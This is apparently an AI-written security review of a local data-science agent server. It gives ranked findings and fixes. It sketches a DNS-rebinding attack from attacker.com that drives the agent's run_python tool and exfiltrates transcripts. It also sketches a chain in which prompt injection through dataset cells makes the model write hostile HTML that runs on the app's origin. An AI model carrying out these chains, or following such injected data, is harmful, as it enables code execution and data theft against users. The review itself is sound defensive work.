# Round 1 — security-review (Opus 4.8) — verbatim

Lens: security of a local-first dev tool (local bar). Reviewed 2026-09-18 at commit
`8ac2758`. No files modified. Superseded in scope by `../round2/03-saas-security.md`, which
re-ranks these under the commercial bar and adds the sandbox probe.

---

Adversarial security review of dsagent serve. Read the actual code. Findings ranked by severity.

=== HIGH ===

1. DNS-rebinding → full API access → code execution via the agent. No Host-header validation anywhere (no TrustedHostMiddleware, no CORS, no auth). serve.py build_app (~line 171) mounts every route open; default bind is 127.0.0.1 (cli.py:288,339) which is good, but binding to localhost does NOT stop DNS rebinding. Exploit: user runs `dsagent serve` and, while it's up, browses attacker.com. Attacker rebinds attacker.com's DNS to 127.0.0.1; the page's origin (attacker.com) now resolves to the local server, so `fetch("http://attacker.com:8000/...")` is same-origin from the browser's view and responses are readable. The page can then: read every transcript (GET /projects/{id}/sessions → GET /sessions/{id}), read all project files, DELETE /sessions and datasets, and POST /agent with crafted messages to drive the orchestrator — which has a run_python tool, i.e. arbitrary code execution in the user's env plus data exfil, all with no foothold and no user misconfiguration. Fix: add starlette TrustedHostMiddleware(allowed_hosts=["localhost","127.0.0.1", ...]) so a foreign Host is rejected; optionally an Origin/CSRF check on state-changing routes. This is the same class the team already guards against with iframe sandboxing — the API just isn't covered.

2. Same-origin model-written HTML with NO CSP. serve.py:547-553 `project_file` serves /projects/{id}/files/{path} via bare FileResponse — no Content-Security-Policy, no Content-Disposition, no nosniff. The UI (ChatCenter.tsx:196-208 ProjectArtifacts) links these with target="_blank", opening a model-written report.html as a full document at the app's own origin. Its <script> then runs same-origin: read/write localStorage, same-origin fetch to /agent, /projects, /runs, /sessions — exfiltrate the transcript, delete data, or drive the agent. Chain: malicious dataset (or fetched content) → prompt injection → model writes hostile HTML → served same-origin → user clicks the chip → runs in app origin. This is exactly the boundary the team deliberately built elsewhere: the runs canvas uses SCRIPTED_PREFIX + SCRIPTED_CSP="sandbox allow-scripts; base-uri 'none'; form-action 'none'" (serve.py:440-486), and export.html ships Content-Disposition: attachment + sandbox CSP (api.py:543-582). The project-files route got none of it. The ChatCenter comment (lines 174-176) shows they consciously chose the un-sandboxed tab because a sandboxed iframe "paints blank" — that choice IS the hole. Fix: send `Content-Security-Policy: sandbox allow-scripts; base-uri 'none'; form-action 'none'` (a `sandbox` response CSP applies to top-level navigations too and gives the doc an opaque origin), plus X-Content-Type-Options: nosniff, on the project-files response — mirror what runs files/export already do.

=== MEDIUM ===

3. Prompt injection via datasets/artifacts (brief, as requested). Uploaded CSVs are read by the model (_profile_inputs api.py:613 puts cell samples into the plan; seed_run copies data into the workspace the model reads) and the model re-reads its own reports. Untrusted cell content reaching the model is the trigger for #2's chain. No guarding/spotlighting. Inherent to the product; the real mitigation is sandboxing model output (#2), not trusting the data.

4. Unbounded upload body. api_projects.py:66 (`payload = await request.body()`) and api.py:294 read the entire body into memory with no size cap; store_dataset (datasets.py:31) write_bytes unconditionally. Memory/disk DoS, and store_dataset silently OVERWRITES an existing dataset of the same sanitized name (poison a dataset, or collide "a b.csv"/"a_b.csv"). Low on pure localhost, rises with #1 (a rebinding page can fill the disk). Fix: enforce a max content-length; consider refusing overwrite or versioning.

=== CHECKED — NOT VULNERABLE (so you can stop worrying about these) ===

- Path traversal in resolve_project_file (serve.py:496-511) and resolve_run_file (serve.py:408-437): both do (ws / rel).resolve() THEN is_relative_to(ws) — the correct order. Absolute paths (pathlib discards the left side), `..`, URL-encoded `%2e%2e` (Starlette decodes before the handler), and symlinks escaping the workspace (resolve() follows them, then the containment check rejects) are all blocked. `.dsagent/` is excluded, so the checkpoint sqlite (which holds transcripts) and materialized skills aren't served. gate_version (api.py:510-532) is likewise resolve-then-contain — safe.
- Arbitrary file WRITE via dataset upload: safe_name (datasets.py:20-25) takes Path(name).name (drops dirs), maps everything outside [A-Za-z0-9._-] to _, strips leading dots, and `..`→"file". Write is confined to data_dir. project_id/name are validated by _safe_id before any write (404 on `/`,`\`,`.`,`..`). _store_upload/_safe_name (api.py:750-802) same. No escape.
- Session/project id injection: _safe (sessions.py:21) and _safe_id (projects.py:50) both neutralize `/`,`\`,`..`; no path escape. Minor: sessions._safe truncates to 128 chars, so two very long ids could collide onto one file (clobber) — low.

=== TOP 3 TO FIX FIRST ===
1. Add Host-header validation (TrustedHostMiddleware) — closes DNS rebinding → agent RCE on the default deployment. (#1)
2. Add a sandbox CSP + nosniff to /projects/{id}/files/{path} — stops model-written HTML from running on the app origin. (#2)
3. Cap upload body size on the dataset/run upload routes. (#4)
